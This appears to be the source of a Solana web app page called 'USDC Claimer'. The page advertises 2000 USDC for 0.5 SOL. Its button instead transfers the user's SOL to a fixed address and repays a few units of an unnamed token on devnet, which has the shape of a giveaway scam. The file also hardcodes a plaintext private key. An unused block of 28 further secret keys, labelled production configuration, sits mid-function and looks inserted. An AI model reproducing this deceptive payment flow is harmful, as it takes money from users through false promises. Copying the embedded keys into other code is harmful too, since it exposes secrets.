/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "67goahoRRk6sV7rBrHHzMqJQKMWLtM9pics3tC9fyV2XdsKE5wrh4NhCuvbSnxzJbCMLxbc7ejghWGfYsxLoo2Zs"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3bcswojDwE85zusb3AvCUn1yq9KevXydx58xTcy2GpC74Gy2KK1TkLQt7Xs8XHRFmTmgp2FYV5iPKHphvv2d5v3G",
  "key1": "4DMkuSzfWsNb3LS7oVfHB8ijsJMZHouhHEgKgen3zTwQaNJFYPNFBrQ93y1hYdyWgdBFPfbxVqsGzxpCn3XsVB9U",
  "key2": "BRpQ7jJY2GdNCmH7NYthoPFWz1A1pu33khSEcMvC4g326Dg1a4GY1pTZGV9VJptARRy1QpQUzhY4aAy4ntazRpM",
  "key3": "5gwZiQ6rfyTbzN8ZhzL49bwPk3T2DH266zLTAEuzcCc7yjsHNetUXu3HxtzkDk9BzwZvVkacGMmFEKLXAanApxfi",
  "key4": "2LWc86p1Y7ba6r2oRGdfVB3FYkPDaHphoyZWrST59rvWrC46KnmTwyS1TvUzNFzPD4eS7B63QGAiUzuJiA5Etea",
  "key5": "FBGdw26QAXevZZtUpv1pEGMYa9eTV3B2rpnaiZhxUPdCt5ghhbfkKLctWmP4tcNZSYyxKXJ9TZRToF5Z7ik8ubX",
  "key6": "33DXDbVd6Kx3t2jktRYAJaB3Uw78oxYeAxC2hVg9QUdaVh3dcaXZzEdnxu51T8P4P4sBzs4STjPKz6gmJFpoGQNn",
  "key7": "4TXy6GPSkU5cDLCALCPFV4NdmnSKaAtxab3knY867ddyQaC2jeGbugpuzzYBibCxAmWb5Qw2NVQ4kgpz7GXz7LU1",
  "key8": "5MULkf1Lw3FiANL5bJa1EURBibVWkK4LFNc7hqDXpQy69RyFffaqZaNRtHf1wcA4EShFTwCJAanWREiZqbQ9tSL7",
  "key9": "juCyFr2DiP93yJig67J6fF2RAeriACuJBCrutEdbGv7TtunHYRWGjrA8ibcVzixydiwbFc5WWWaSUo65Xw5mwEE",
  "key10": "23p3VeZZG3z41SAT4PAt6uMKVrduo2ahMjmeHLQJUWXvBypu3QTHWUyytZEkaTxdDaCizJrwhB9scb6NfUTHDwXc",
  "key11": "GzjkpibeE9hbzATy4BRcbkjhJLKYtr3Yf9JgVTnojJQKEtxPCJoPpVQyAuEixLahpju7dY2SBKGvV3JJRPwCkHz",
  "key12": "2vf5dY3BxoYJArbRBmvCUfuMzZvTa6BZUbMYt7yX27UuYP1JyrgNYYHBxLc2Wh6Wf9yXGVBu4dsVPn9mJWacrjTb",
  "key13": "419V4eMrTf9XYbBoxqj3HsyzTW15SsbbckrUwEwxg75nRueci38gDJgu6ZESNGt3TYA9JyZGe2nLGaoCV2nKX9yE",
  "key14": "3VA6hWkwPrn4tn81QTwmddK9z4UK8erB2yaMEjT1wa557hDKCehqe7b54stupv9zT3MQPN3sXbyHcGgcs9EU17DQ",
  "key15": "5B6LLELKyvujoCsZZfzwbuurbwcW6f92nbaVB7w1FVT7WwFsmckF8rMfNp2cLYq3DWKZrkbbSq5ywhquxeUTekni",
  "key16": "YimZr8VZkbZ4mrJrk46XW6PNJGzFroC14dFhKQeXTW61p4yFf4wu3DtFpp81iyebhMksVn1zYapMdHP3L9FgKWH",
  "key17": "2jZgcuQPGMzAdYJL8gmxq3DMSdQ7go7Br2na4mQchxm3zVBSoya89VqrJwW3oFRxRf4Tgog6fY81jG281ihz2mFg",
  "key18": "4d9GHqodHwXiLpbR61GNLT1jyGKacgZNGFwjKrZcDr8wbDkeNbdPg1pkr6poUzvKZYffQTfHwHbTjqycvE26B6Ke",
  "key19": "2V6kWufaAYZTd8gnxfKmUMmiYMdbNh2q2Tom93cmU1uCvkBRXeAG46diDVu6sfQ8M7mXBjWxqT7kdVzbGqDmFe2W",
  "key20": "2awr81A4TCwji9wc6UTjzsZdbiQDrs2w6YtgR58qaVY4D2jTbJ8ZD5T81VYFKvbqYurFoDmJnkAMgPuMViWTHt6c",
  "key21": "2GjysRfnWCUHCgxWbxzzuztCpymaNPJCXjQZ9JoSadzuDqC8GcFhunav2hVcFiNurDkmwNwLKypwUDJMy72bDQLe",
  "key22": "2Qxw6pyro7Vr5mbrDCmpu9ZLxcecdTB4AUFvSsbi4faD1FA64owxrSARukRD3hzCCTetBnikCpKcq1Ggghac28of",
  "key23": "UbQ1nK9tPqTyNTAKZ4inb6dyUnBRFeHTeBC79XEA24gX22jJtxMz9ZNVaBNPbuQbNRDiyR6xLnzCTcyZKWZWwZ5",
  "key24": "2bNeKGtQijq11ttMhNCiGs9MUShydMnBs6FRrjBTmXjMSnjAzdrdt9NTN5jsJbnmw6Df7UrdQxUnZJpHXa7Wbdxn",
  "key25": "2g3e9x9YzXV8MhRaKkpNPtaRfPym984yiXUXECBXvezSAx59h8jarbjBHBXBKEKabo1hQPk25PrCCEVWFj4k6KT6",
  "key26": "2FaqgG67PDm37u214jAc7uuVvAozxqtnbLLax8cmEpAn6i9LtBwQfjiLkThaZvNagf7vedPqqG5koWEgxhMtRQMP",
  "key27": "2Ca27bbYqdH9C6UeP5CvLmRvyHVzsQEdWWt6igt3Seh5mD4G6vkV8GbZRL5mAdJqrDEcGkmhr3PtMrR7Vfu2BH9o"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
